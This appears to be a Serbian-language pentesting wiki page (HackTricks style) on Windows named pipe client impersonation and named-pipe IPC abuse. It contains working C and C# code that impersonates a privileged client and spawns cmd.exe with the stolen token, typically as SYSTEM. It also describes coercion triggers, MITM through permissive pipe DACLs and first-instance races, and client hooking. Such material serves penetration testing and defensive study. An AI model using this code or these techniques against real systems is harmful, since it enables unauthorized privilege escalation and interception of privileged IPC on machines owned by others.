# Impersonation klijenta Named Pipe-a

{{#include ../../banners/hacktricks-training.md}}

Impersonation klijenta Named Pipe-a je lokalni primitive za eskalaciju privilegija koji omogućava niti servera named pipe-a da preuzme security context klijenta koji se poveže na njega. U praksi, napadač koji može da izvršava code sa SeImpersonatePrivilege može da natera privilegovanog klijenta (npr. SYSTEM service) da se poveže na pipe kojim upravlja napadač, pozove ImpersonateNamedPipeClient, duplicira dobijeni token u primary token i pokrene process kao taj klijent (često NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Ova stranica se fokusira na osnovnu tehniku. Za end-to-end exploit chains koje nateraju SYSTEM da se poveže na vaš pipe, pogledajte stranice Potato family navedene u nastavku.

## TL;DR
- Kreirajte named pipe: \\.\pipe\<random> i sačekajte konekciju.
- Naterajte privilegovanu komponentu da se poveže na njega (spooler/DCOM/EFSRPC/etc.).
- Pročitajte najmanje jednu poruku iz pipe-a, zatim pozovite ImpersonateNamedPipeClient.
- Otvorite impersonation token trenutne niti, DuplicateTokenEx(TokenPrimary), a zatim CreateProcessWithTokenW/CreateProcessAsUser da biste dobili SYSTEM process.<sup>[[2]](#references)</sup>

## Zahtevi i ključni API-ji
- Privilegije koje su obično potrebne procesu/niti koja poziva:
- SeImpersonatePrivilege za uspešan impersonation klijenta koji se povezuje i korišćenje CreateProcessWithTokenW.
- Alternativno, nakon impersonation-a SYSTEM-a možete koristiti CreateProcessAsUser, što može zahtevati SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (one su zadovoljene kada impersonate-ujete SYSTEM).
- Osnovni API-ji koji se koriste:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (mora se pročitati najmanje jedna poruka pre impersonation-a)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ili CreateProcessAsUser
- Nivo impersonation-a: da bi se korisne radnje izvršavale lokalno, klijent mora dozvoliti SecurityImpersonation (podrazumevano za mnoge lokalne RPC/named-pipe klijente). Klijenti mogu da ga smanje korišćenjem SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION prilikom otvaranja pipe-a.<sup>[[3]](#references)</sup>

## Minimalni Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Napomene:
- Ako `ImpersonateNamedPipeClient` vrati `ERROR_CANNOT_IMPERSONATE` (1368), proverite da li ste prvo čitali iz pipe-a i da klijent nije ograničio impersonation na nivo `Identification`.
- Prednost dajte `DuplicateTokenEx` sa `SecurityImpersonation` i `TokenPrimary` da biste kreirali primarni token pogodan za kreiranje procesa.

## .NET brzi primer
U .NET-u, `NamedPipeServerStream` može da izvrši impersonation putem metode `RunAsClient`. Nakon impersonation-a, duplicirajte thread token i kreirajte proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Uobičajeni triggers/coercions za dovođenje SYSTEM-a do vašeg pipe-a
Ove tehnike primoravaju privilegovane servise da se povežu na vaš named pipe, kako biste mogli da izvršite impersonation:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Detaljnu upotrebu i kompatibilnost pogledajte ovde:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ako vam je potreban kompletan primer kreiranja pipe-a i izvršavanja impersonation-a radi pokretanja SYSTEM-a pomoću service trigger-a, pogledajte:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Kada privilegovani servis i proces sa niskim privilegijama komuniciraju preko `\\.\pipe\...`, tretirajte pipe kao bilo koju drugu nepouzdanu IPC granicu. Pored klasičnog server-side impersonation-a, slabi pipe ACL-ovi, nebezbedne zastavice pri kreiranju i odluke client-a zasnovane na poverenju mogu postati primitive za local privilege escalation.<sup>[[7]](#references)</sup>

### Prvo enumerišite potencijalne pipe-ove
- Brzo izlistajte pipe-ove iz PowerShell-a: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` je koristan za uočavanje broja instanci i pipe-ova sa jednom instancom.
- Dajte prioritet imenima koje koriste servisi pokrenuti kao `SYSTEM`, naročito helper-i, updater-i, launcher-i i UI broker-i.

### MITM pomoću permisivnih DACL-ova i dodatnih pipe instanci
- Svaki proces koji može da komunicira sa privilegovanim serverom već može da fuzz-uje njegov protokol i traži privilegovane verb-e.<sup>[[7]](#references)</sup>
- Zanimljiviji slučaj nastaje kada DACL dodeljuje `FILE_GENERIC_WRITE`/`GENERIC_WRITE` nad pipe objektom. Kod named pipe-ova ovo implicitno uključuje `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` deli isti bit), pa attacker može da kreira drugu server instancu sa istim imenom.
- Pošto se instance uparuju FIFO redosledom, instance koje je kreirao attacker i legitimne instance mogu biti izmešane: kreirajte rogue instancu pomoću `CreateNamedPipe`, zatim otvorite isti naziv pipe-a pomoću `CreateFile` i sačekajte da se pravi client poveže na rogue server instancu.
- Rezultat: posmatranje, izmena, relay ili desinhronizacija privilegovanog IPC-a bez potrebe za preuzimanjem originalnog server procesa.

### First-instance race na security descriptor-ima pipe-a
- `lpSecurityAttributes` definiše DACL samo kada se kreira prva instanca pipe imena.<sup>[[4]](#references)[[7]](#references)</sup>
- Ako se privilegovani servis pokreće kasno i ne koristi `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker može unapred da kreira ime pipe-a sa permisivnim DACL-om, a zatim da dozvoli servisu da kasnije kreira instance u security context-u koji je izabrao attacker.
- Ovo pretvara pokretanje servisa u race condition: osvojite prvu instancu, a zatim se povežite na kasnije client-e ili izvršite MITM koristeći oslabljeni ACL.
- Mitigation za defendere, kao i ključna tačka za review kod attackera: proverite da li `CreateNamedPipe(..., dwOpenMode, ...)` uključuje `FILE_FLAG_FIRST_PIPE_INSTANCE`. Ako ne uključuje, testirajte pre-kreiranje pre pokretanja servisa.

### PID/signature provere su hardening, a ne granica
- Neki proizvodi pokušavaju da ograniče pristup proverom `GetNamedPipeClientProcessId`, putanje image-a procesa ili Authenticode signer-a client-a koji se povezuje.<sup>[[7]](#references)</sup>
- Ovo pomaže samo dok ne izvršite injection u legitimni client: kada se nađete unutar trusted procesa, nasleđujete isti PID/image/signature context koji server očekuje.
- Kod split desktop aplikacija, instrumentacija low-privileged UI/helper procesa često je jednostavnija od direktnog napada na `SYSTEM` servis.

### Hook-ujte client u skladu sa njegovim I/O modelom
- Synchronous I/O: presretnite `NtWriteFile` pre nego što syscall potroši buffer, a `NtReadFile` pregledajte/izmenite nakon što se vrati.<sup>[[7]](#references)</sup>
- Overlapped I/O: sačuvajte `OVERLAPPED`/`IoStatusBlock` viđen u `NtReadFile`, a zatim pregledajte buffer nakon završetka `GetOverlappedResult` ili relevantnog wait-a.
- Completion port-ovi: `GetQueuedCompletionStatus` stiže do `NtRemoveIoCompletion`; vraćeni `ApcContext` vodi nazad do `OVERLAPPED` strukture korišćene u originalnom read-u, što je odgovarajuća tačka za pronalaženje sada popunjenog buffer-a.
- Completion routine-i (`ReadFileEx`): completion callback se isporučuje kao APC. Ako želite da menjate vraćene podatke ili ubacujete synthetic replies, hook-ujte stvarni completion routine, a za custom injection koristite one-argument `QueueUserAPC` dispatcher koji ponovo konstruiše 3 očekivana argumenta routine-a.<sup>[[5]](#references)[[7]](#references)</sup>

### Napomene o tooling-u
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) prosleđuje named-pipe saobraćaj kroz injected helper DLL i pruža Burp-like workflow za izmenu/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) koristi pristup zasnovan na Frida-i i fokusira se na hooking `NtReadFile`/`NtWriteFile` i prethodno opisane async/completion pivot-e, a zatim prosleđuje saobraćaj ka editing workflow-u zasnovanom na WebSocket-u.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operativna razmatranja
- Named pipes imaju malu latenciju; duge pauze tokom uređivanja bafera mogu dovesti do deadlock-a krhkih servisa.<sup>[[7]](#references)</sup>
- Klijenti zasnovani na overlapped/completion-port/APC mehanizmima zahtevaju drugačije hooks od jednostavnih `ReadFile`/`WriteFile` detours.
- Injection u trusted client je bučan i generalno ga je najbolje ograničiti na razvoj exploita, reverzno analiziranje protokola ili lokalno fuzzing testiranje.

## Rešavanje problema i česte zamke
- Morate pročitati najmanje jednu poruku iz pipe-a pre pozivanja `ImpersonateNamedPipeClient`; u suprotnom ćete dobiti `ERROR_CANNOT_IMPERSONATE (1368)`.<sup>[[1]](#references)</sup>
- Ako se klijent poveže sa `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, server ne može u potpunosti da izvrši impersonation; proverite nivo impersonation-a tokena pomoću `GetTokenInformation(TokenImpersonationLevel)`.<sup>[[3]](#references)</sup>
- `CreateProcessWithTokenW` zahteva `SeImpersonatePrivilege` kod pozivaoca. Ako to ne uspe uz `ERROR_PRIVILEGE_NOT_HELD (1314)`, koristite `CreateProcessAsUser` nakon što ste već izvršili impersonation naloga SYSTEM.
- Uverite se da security descriptor vašeg pipe-a dozvoljava ciljanom servisu povezivanje ako ga hardenujete; podrazumevano, pipe-ovi ispod `\\.\pipe` dostupni su u skladu sa DACL-om servera.<sup>[[3]](#references)</sup>

## Reference

- [1] [Windows: dokumentacija za ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: privilege escalation pomoću Windows named pipes](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: bezbednost named pipe-ova i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: funkcija CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server pomoću completion routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – Windows named pipe proxy alat](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
